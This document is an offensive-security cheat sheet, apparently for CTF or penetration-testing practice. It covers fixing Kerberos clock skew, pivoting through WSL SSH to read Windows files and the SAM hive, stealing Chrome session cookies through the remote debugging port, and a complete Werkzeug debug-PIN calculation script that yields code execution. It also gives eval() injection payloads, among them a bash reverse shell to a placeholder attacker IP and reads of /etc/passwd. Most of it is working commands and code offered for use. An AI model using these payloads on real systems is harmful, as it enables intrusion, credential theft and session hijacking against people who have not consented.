Kerberos Clock Synchronization

In Kerberos, time is used to ensure that tickets are valid. The default clock skew tolerance is 5 minutes.

Detect Clock Skew

With nmap:

nmap -sV -sC <TARGET_IP>
## clock-skew: mean: -1998d09h03m04s, deviation: 4h00m00s, median: -1998d11h03m05s

Check manually:

nmap -sT <TARGET_IP> -p445 --script smb2-time -vv

Fix Clock Skew

Option 1 - Modify your clock:

sudo date -s "14 APR 2015 18:25:16"  # Linux
net time /domain /set                  # Windows

Option 2 - Fake your clock:

faketime -f '+8h' date

WSL (Windows Subsystem for Linux) as a Pivot Point

When WSL is installed on a Windows target, it typically binds an SSH daemon on a non-standard port and provides full access to the Windows filesystem via /mnt/c/.

## SSH into WSL on non-standard port (common: 2222, 2200, 22222)
ssh <USER>@<TARGET_IP> -p 2222

## WSL mounts the full Windows C: drive
ls /mnt/c/Users/
ls /mnt/c/Users/<USER>/Desktop/
ls /mnt/c/Users/<USER>/AppData/Roaming/

## Access Windows credentials / SAM hive from WSL
cat /mnt/c/Windows/System32/config/SAM  # (requires SYSTEM perms)

## Run Windows executables from WSL
/mnt/c/Windows/System32/cmd.exe /c whoami

## Port forward to reach internal services via WSL pivot
ssh -L <LOCAL_PORT>:127.0.0.1:<REMOTE_PORT> <USER>@<TARGET_IP> -p 2222

## Exfiltrate files via SCP through WSL
scp -P 2222 <USER>@<TARGET_IP>:/mnt/c/path/to/file .


**Key insight:** WSL SSH typically runs as the Windows user's WSL identity. If the Windows user is a local admin, `/mnt/c/` access effectively gives full disk read access — useful for reading flag files, credential stores, and config files without needing a full Windows shell.

Chrome Remote Debugging — Session Cookie Theft

If Chrome is running on a target with the remote debugging port open (default: 9222), it is possible to steal all session cookies and authenticated sessions via the DevTools Protocol.

## Step 1: SSH tunnel to the Chrome debug port on the target
ssh -L 9222:127.0.0.1:9222 <USER>@<TARGET_IP>

## Step 2: Open chrome://inspect in your local browser
## Navigate to: chrome://inspect/#devices
## Under "Remote Target" — click "inspect" on any open tab

## Step 3: In the DevTools console, dump all cookies
document.cookie

## Or use the DevTools Protocol directly via curl
curl http://127.0.0.1:9222/json          # List open tabs/contexts
curl http://127.0.0.1:9222/json/version  # Chrome version info

## Step 4: Use extracted cookies in your browser (EditThisCookie extension)
## or via curl:
curl -b "session=<COOKIE_VALUE>" http://<TARGET>/dashboard

Key insight: Applications running inside Chrome on the target (internal portals, admin panels) may have authenticated sessions. Stealing cookies via debug port gives access to those sessions without needing credentials.

Werkzeug Debug PIN Calculation (Flask RCE)

When a Flask/Werkzeug application is running in debug mode and the interactive debugger is exposed, you can calculate the PIN to gain a Python console with RCE. Requires reading several system values from the target.

## Required values (gather from target):
## 1. Username running the Flask app
cat /etc/passwd | grep -i flask  # or check process owner
ps aux | grep python

## 2. Flask app filename (absolute path)
## Usually: /app/app.py, /opt/app/server.py, etc.

## 3. Machine ID (one of these files)
cat /etc/machine-id
cat /proc/sys/kernel/random/boot_id   # fallback
cat /proc/self/cgroup                  # for Docker containers (last field after /)

## 4. Network interface MAC address (decimal, not hex)
cat /sys/class/net/eth0/address
## Convert: aa:bb:cc:dd:ee:ff → int(aabbccddeeff, 16)

## PIN calculation script (Werkzeug < 2.2.x formula)
python3 << 'EOF'
import hashlib, itertools

username = '<USER>'           # app owner
modname = 'flask.app'         # always this
appname = 'Flask'             # always this  
app_path = '/app/app.py'      # absolute path to Flask app file
mac_address = int('<MAC_HEX_NO_COLONS>', 16)  # e.g. int('aabbccddeeff', 16)
machine_id = '<MACHINE_ID>'   # from /etc/machine-id or /proc/sys/kernel/random/boot_id

probably_public_bits = [username, modname, appname, app_path]
private_bits = [str(mac_address), machine_id]

h = hashlib.sha1()
for bit in itertools.chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]
num = None
grp = None
for i in range(1, 10):
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]
    grp = '-'.join([num[:3], num[3:6], num[6:]])

print(f'PIN: {grp}')
EOF

## Use the PIN at the Werkzeug debugger URL
## http://<TARGET>:<PORT>/console  → enter PIN → Python console → RCE

Python eval() Injection via API Field

When an API endpoint passes user-supplied input to Python's eval() or exec(), it results in server-side code execution.

## Identify the vulnerable field (look for mathematical/expression-evaluating APIs)
curl -X POST http://<TARGET>/api/calculate -H "Content-Type: application/json" \
  -d '{"expression": "1+1"}'

## Test for eval() injection with a simple payload
curl -X POST http://<TARGET>/api/calculate -H "Content-Type: application/json" \
  -d '{"expression": "__import__(\"os\").system(\"id\")"}'

## Reverse shell via eval()
curl -X POST http://<TARGET>/api/calculate -H "Content-Type: application/json" \
  -d '{"expression": "__import__(\"os\").system(\"bash -c '"'"'bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1'"'"'\")"}'

## Read files via eval()
curl -X POST http://<TARGET>/api/calculate -H "Content-Type: application/json" \
  -d '{"expression": "open(\"/etc/passwd\").read()"}'

## List directory
curl -X POST http://<TARGET>/api/calculate -H "Content-Type: application/json" \
  -d '{"expression": "__import__(\"os\").listdir(\"/\")"}'

Common API fields to test for eval(): expression, formula, query, filter, template, script, command, calculation.
